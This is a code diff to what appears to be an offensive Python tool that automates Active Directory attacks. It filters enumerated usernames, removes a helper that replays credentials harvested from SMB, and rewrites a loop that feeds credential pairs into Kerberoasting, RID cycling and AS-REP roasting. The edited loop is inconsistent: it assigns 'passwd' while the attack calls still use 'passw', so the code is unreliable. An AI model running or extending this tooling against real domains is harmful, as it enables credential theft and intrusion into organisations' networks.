@@ -20,7 +20,7 @@ def enum_users(target, domain):
                 print(f'[!] {cmd}')
                 printc('[+] Some usernames where found.', GREEN)
                 for line in output.splitlines():
-                    if domain in line:
+                    if (domain in line) and (not target in line):
                         user = line.split('@')[0].split(' ')[-1]
                         printc(user, BLUE)
                         users.append(user)
@@ -141,27 +141,6 @@ def check_kerberoast(target, domain, user='Guest', passw=''):
                     printc(f'[-] {e}', RED)
 
 
-def check_smb_credentials(target, domain):
-    #print('checking smb credentials file')
-    # Check credentials founded on SMB first:
-    if os.path.exists('smb_credentials.txt'):
-        with open('smb_credentials.txt', 'r') as file:
-            credentials = file.readlines()
-        cred = ''
-        for item in credentials:
-            if ('Guest' not in item) and (':' in item):
-                cred = item
-                user, passwd = cred.split(':')[:2]
-                #print('check kerberoast with creds')
-                check_kerberoast(target, domain, user, passwd)
-                #print('try to regenerate smb_users.txt file using creds before asreproast')
-                rid_cycling(target=target, domain=domain, user=user, passw=passwd)
-                #print('check asreproast with creds')
-                check_asreproast(target, domain, user, passwd)
-                return True
-    return False
-
-
 def check_asreproast(target, domain, user='Guest', passw=''):
     # NULL
     filename = 'smb_users.txt'
@@ -206,9 +185,9 @@ def bruteforce_kerberos_users(target, domain):
             check_asreproast(target, domain)
         else:
             for creds in credentials:
-                user = creds.split(':')[0]
-                passw = user = creds.split(':')[1]
+                user, passwd = creds.split(':')[:2]
                 check_kerberoast(target, domain, user, passw)
+                rid_cycling(target, domain, user, passwd)
                 check_asreproast(target, domain, user, passw)
 
 
